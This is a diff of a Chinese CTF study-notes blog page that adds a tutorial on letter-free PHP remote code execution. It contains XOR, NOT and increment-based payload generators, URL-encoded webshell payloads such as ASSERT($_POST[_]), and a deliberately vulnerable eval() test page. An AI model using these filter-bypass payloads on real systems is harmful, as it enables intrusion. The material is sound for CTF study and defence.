@@ -30,7 +30,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2024-10-31T12:21:15.000Z">
-<meta property="article:modified_time" content="2025-03-03T13:58:28.851Z">
+<meta property="article:modified_time" content="2025-03-09T21:54:40.797Z">
 <meta property="article:author" content="Bae">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
@@ -211,7 +211,7 @@
         <div class="label text-third-text-color text-sm">分类</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
         <div class="label text-third-text-color text-sm">文章</div>
     </a>
 </div>
@@ -248,7 +248,7 @@
 				<div class="author flex items-center">
 					<span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
 					
-					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
 					
 				</div>
 				<div class="meta-info">
@@ -262,8 +262,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-03-03 21:58:28</span>
-            <span class="mobile">2025-03-03 21:58:28</span>
+            <span class="desktop">2025-03-10 05:54:40</span>
+            <span class="mobile">2025-03-10 05:54:40</span>
             <span class="hover-info">更新</span>
         </span>
     
@@ -502,6 +502,524 @@ bash
 
 这里用;闭合了前面的nc   之后用grep函数去匹配flag肯定会有的前大括号
 
+
+
+
+
+
+
+
+
+
+
+
+
+%0a是换行
+
+%09是空格
+
+
+
+
+
+## 无字母RCE
+
+# 前言
+
+我们上节课学了关键字的bypass，那么有没有什么无解一点的，更加暴力一点的解法呢，这就是今天我们要讲的三件套，自增、取反、异或，这三种方法是CTF中的常考项。
+
+# 异或RCE
+
+环境为PHP7
+ 以按位疑惑为例子：
+
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);  <span class="comment">//新创建一个文件，也就是rce_or.txt，给他写的权限</span></span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>); <span class="comment">//ascii的前16个字符的十六进制应该是01，02，所以在前缀加‘0’</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment">//前16个后面的就不用加0了</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);   <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);      <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> =<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;     <span class="comment">//如果有符合条件的就筛掉，输出空格</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;             <span class="comment">//可以使用的字符如下</span></span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;    <span class="comment">//十六进制前加百分号就变成了URL编码格式</span></span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));  <span class="comment">//urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;          <span class="comment">//ord函数是将字符变成ASCII码</span></span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;     <span class="comment">//每次到这里都写入刚刚建立的文本内</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()  <span class="comment"># 逐行读取文件 //每一次循环，指针都会指向下一行，输出下一行的字符</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:  <span class="comment"># 读到空，即读完跳出循环</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:  <span class="comment"># 就比如我们这边输入的arg是system，当文本当前行第一个字母是s或者y这些字符就写入s1,s2</span></span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 提取第一个字符串，具体可以看上面我的截图，如第一行的%00</span></span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]  <span class="comment"># 提取第二个字符串</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span>  <span class="comment"># s1和s2进行或运算就可以合成对应的字母s,y,s,t,e,m</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function:&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+首先来讲一下原理把：
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">  echo &quot;&quot;;     //如果有符合条件的就筛掉，输出空格</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else&#123;             //可以使用的字符如下</span><br><span class="line">     $a=&#x27;%&#x27;.$hex_i;    //十六进制前加百分号就变成了URL编码格式</span><br><span class="line">     $b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">     $c=(urldecode($a)^urldecode($b));  //urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+主要的PHP代码在这里，这段代码的意思是利用hex2bin来获取filter以外的字符，如空白字符，一些乱码之类的，但是这些字符都有对应的二进制数字，所以可以进行取反，异或之类的操作
+
+举个栗子吧，以脚本生成的结果中调几个来看：
+ ![image.png](https://www.nssctf.cn/files/2024/1/24/0f3189c549.png)
+ 看到92行，意思就是%04|%27的结果URL解码后就是#
+ 在本地测试一下看看：
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hex2bin(&#x27;04&#x27;).&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo hex2bin(&#x27;27&#x27;).&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo (urldecode(&#x27;%04&#x27;)^urldecode(&#x27;%27&#x27;));</span><br><span class="line">?&gt;	</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+![image.png](https://www.nssctf.cn/files/2024/1/24/05826c6d7a.png)
+ 从结果来看就是那些满足filter条件的字符，不是数字也不是字母，是一些特殊符号和乱码，如果filter中过滤了特殊符号，那就修改一下脚本即可
+
+用两个乱码合成了一个#，可以这么理解
+ 最后再来谈谈结果的原理：
+ ![image.png](https://www.nssctf.cn/files/2024/1/24/555bf2bb7e.png)
+ (“%0f%08%0f%09%0e%06%0f”^“%7f%60%7f%60%60%60%60”)(“%0b”^“%3a”)
+ 就好比我们的system('ls)，我们看看这一堆东西输入进去后为什么会变成答案？
+ 首先URL会帮你解码一次，我感到好奇的是双引号的作用，本地测试一下
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">echo $code;</span><br><span class="line">if(preg_match(&#x27;/[a-z0-9]/i&#x27;,$code))&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">eval($code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+我们payload：?code=(“%0f%08%0f%09%0e%06%0f”^“%7f%60%7f%60%60%60%60”)(“%0b”^“%3a”);
+ ![image.png](https://www.nssctf.cn/files/2024/1/24/f847c3f0c2.png)
+ 看得到结果输出的code是一滩乱码，这是因为被URL解码过了，由于这些乱码我们都没过滤，所以可以满足条件
+ 猜测是在eval内完成了异或的操作
+ 本地测试一下能否进行异或操作：
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urldecode(&quot;%0f%08%0f%09%0e%06%0f&quot;)^urldecode(&quot;%7f%60%7f%60%60%60%60&quot;);</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo urldecode(&quot;%0b&quot;)^urldecode(&quot;%3a&quot;);</span><br><span class="line">?&gt;   </span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+![image.png](https://www.nssctf.cn/files/2024/1/24/59a7d4123d.png)
+ 是可行的，都解出来了，这样对原理就清楚了
+
+# 取反RCE
+
+在php内取反很方便，因为php内可以取反字符串，而在python内就显得麻烦的多，取反脚本如下：
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//在命令行中运行</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+意思就是先对输入的字符串进行取反，我们payload时二次取反达到还原的目的，
+ 了解一下取反的原理：
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo ~&#x27;phpinfo()&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+![image.png](https://www.nssctf.cn/files/2024/1/24/64776e473d.png)
+ 可以看到是乱码！所以可以绕过preg_match的过滤，我们把这乱码二次取反后：
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=~&#x27;phpinfo();&#x27;;</span><br><span class="line">echo ~$a;</span><br><span class="line">?&gt;</span><br><span class="line">    </span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+![image.png](https://www.nssctf.cn/files/2024/1/24/4cffdfb95a.png)
+ 可以还原，和上面的异或其实是一个意思
+
+# 自增RCE
+
+[RCE篇之无数字字母rce_mb5fd86d5f5874e的技术博客_51CTO博客](https://blog.51cto.com/u_15057851/4220892)
+ 参考以上文章
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].[]; //俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span><br><span class="line">$__=&#x27;&#x27;;  //两个短杠赋值为空</span><br><span class="line">$_=$_[&#x27;&#x27;];//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span><br><span class="line">$_=++$_; //b</span><br><span class="line">$_=++$_; //c</span><br><span class="line">$_=++$_; //d</span><br><span class="line">$_=++$_; //e</span><br><span class="line">$__.=$_; //E  把两个短杠赋值为E</span><br><span class="line">$_=++$_; //F  一个短杠继续自增</span><br><span class="line">$_=++$_; //G </span><br><span class="line">$__=$_.$__; // GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span><br><span class="line">$_=++$_; //H 此处一个短杠继续自增，为H</span><br><span class="line">$_=++$_; //I</span><br><span class="line">$_=++$_; //J</span><br><span class="line">$_=++$_; //k</span><br><span class="line">$_=++$_; //L</span><br><span class="line">$_=++$_; //M</span><br><span class="line">$_=++$_; //N</span><br><span class="line">$_=++$_; //O</span><br><span class="line">$_=++$_; //P</span><br><span class="line">$_=++$_; //Q</span><br><span class="line">$_=++$_; //R</span><br><span class="line">$_=++$_; //S</span><br><span class="line">$_=++$_; //T</span><br><span class="line">$__.=$_; // GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span><br><span class="line">$&#123;&#x27;_&#x27;.$__&#125;[_]($&#123;&#x27;_&#x27;.$__&#125;[__]); // 进行拼接，$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span><br><span class="line">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&#x27;_&#x27;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+第二个payload需要PHP小于7的版本，因为在PHP7，assert不再可以被动态调用
+
+# 缓存文件RCE
+
+https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html
+ 学p文看p文，p神在早些年说过一个有关php缓存文件rce的trick，当我们往服务器POST上传一个文件时，php会在tmp目录下生成缓存
+
+# RCE-Challenge-7
+
